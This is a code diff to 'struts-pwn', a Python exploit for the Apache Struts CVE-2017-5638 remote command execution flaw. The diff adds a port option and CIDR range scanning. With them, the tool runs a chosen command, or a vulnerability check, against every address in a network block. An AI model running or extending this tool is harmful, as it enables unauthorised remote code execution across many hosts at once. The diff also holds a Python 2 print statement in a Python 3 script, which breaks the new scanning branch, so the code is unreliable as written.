@@ -1,17 +1,21 @@
 #!/usr/bin/env python3
 # coding=utf-8
-# *****************************************************
+# **********************************************************
 # struts-pwn: Apache Struts CVE-2017-5638 Exploit
-# Author:
+# Original author:
 # Mazin Ahmed <Mazin AT MazinAhmed DOT net>
 # This code is based on:
 # https://www.exploit-db.com/exploits/41570/
 # https://www.seebug.org/vuldb/ssvid-92746
-# *****************************************************
+# Addons:
+# Cristian 'void' Giustini <void AT voidzone DOT it>
+# Added CIDR notations for range scanning and port parameter
+# **********************************************************
 import sys
 import random
 import requests
 import argparse
+from netaddr import *
 
 # Disable SSL warnings
 try:
@@ -22,7 +26,7 @@ except:
 
 if len(sys.argv) <= 1:
     print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
-    print('[*] Struts-PWN - @mazen160')
+    print('[*] Struts-PWN - @mazen160 - Modded by @void')
     print('\n%s -h for help.' % (sys.argv[0]))
     exit(0)
 
@@ -40,6 +44,14 @@ parser.add_argument("-c", "--cmd",
                     help="Command to execute. (Default: id)",
                     action='store',
                     default='id')
+parser.add_argument("-r", "--range",
+                    dest="rangelist",
+                    help="Check a list of IPs (CIDR)",
+                    action='store')
+parser.add_argument("-p", "--port",
+                    dest="port",
+                    help="Port (default 80)",
+                    action="store")
 parser.add_argument("--check",
                     dest="do_check",
                     help="Check if a target is vulnerable.",
@@ -47,21 +59,24 @@ parser.add_argument("--check",
 args = parser.parse_args()
 url = args.url if args.url else None
 usedlist = args.usedlist if args.usedlist else None
+rangelist = args.rangelist if args.rangelist else None
 url = args.url if args.url else None
 cmd = args.cmd if args.cmd else None
+port = int(args.port) if args.port else 80
 do_check = args.do_check if args.do_check else None
 
 
-def url_prepare(url):
+def url_prepare(url, port):
+    url = str(url)
     url = url.replace('#', '%23')
     url = url.replace(' ', '%20')
     if ('://' not in url):
-        url = str('http') + str('://') + str(url)
-    return(url)
+        url = "http://%s:%d" % (url, port)
+    return url
 
 
-def exploit(url, cmd):
-    url = url_prepare(url)
+def exploit(url, cmd, port):
+    url = url_prepare(url, port)
     print('\n[*] URL: %s' % (url))
     print('[*] CMD: %s' % (cmd))
 
@@ -99,8 +114,8 @@ def exploit(url, cmd):
     return(output)
 
 
-def check(url):
-    url = url_prepare(url)
+def check(url, port):
+    url = url_prepare(url, port)
     print('\n[*] URL: %s' % (url))
 
     random_string = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(7))
@@ -127,20 +142,37 @@ def check(url):
     return(result)
 
 
-def main(url=url, usedlist=usedlist, cmd=cmd, do_check=do_check):
+def main(url=url, usedlist=usedlist, rangelist=rangelist, port=port, cmd=cmd, do_check=do_check):
     if url:
         if do_check:
-            result = check(url)  # Only check for existence of Vulnerablity
+            result = check(url, port)  # Only check for existence of Vulnerablity
             output = '[*] Status: '
             if result is True:
                 output += 'Vulnerable!'
             else:
                 output += 'Not Affected.'
         else:
-            output = exploit(url, cmd)  # Exploit
+            output = exploit(url, cmd, port)  # Exploit
         print(output)
 
-    if usedlist:
+    if rangelist:
+        try:
+            net = IPNetwork(rangelist)
+        except AddrFormatError:
+            print('Error: Invalid CIDR provided')
+            exit(1)
+        for ip in net:
+            if do_check:
+                result = check(ip, port)
+                output = '[*] Status: '
+                if result is True:
+                    output += 'Vulnerable!'
+                else:
+                    output += 'Not Affected.'
+            else:
+                output = exploit(ip, cmd, port)
+            print output
+    elif usedlist:
         URLs_List = []
         try:
             f_file = open(str(usedlist), 'r')
@@ -155,21 +187,21 @@ def main(url=url, usedlist=usedlist, cmd=cmd, do_check=do_check):
             exit(1)
         for url in URLs_List:
             if do_check:
-                result = check(url)  # Only check for existence of Vulnerablity
+                result = check(url, port)  # Only check for existence of Vulnerablity
                 output = '[*] Status: '
                 if result is True:
                     output += 'Vulnerable!'
                 else:
                     output += 'Not Affected.'
             else:
-                output = exploit(url, cmd)  # Exploit
+                output = exploit(url, cmd, port)  # Exploit
             print(output)
 
     print('[%] Done.')
 
 if __name__ == '__main__':
     try:
-        main(url=url, usedlist=usedlist, cmd=cmd, do_check=do_check)
+        main(url=url, usedlist=usedlist, rangelist=rangelist, port=port, cmd=cmd, do_check=do_check)
     except KeyboardInterrupt:
         print('\nKeyboardInterrupt Detected.')
         print('Exiting...')
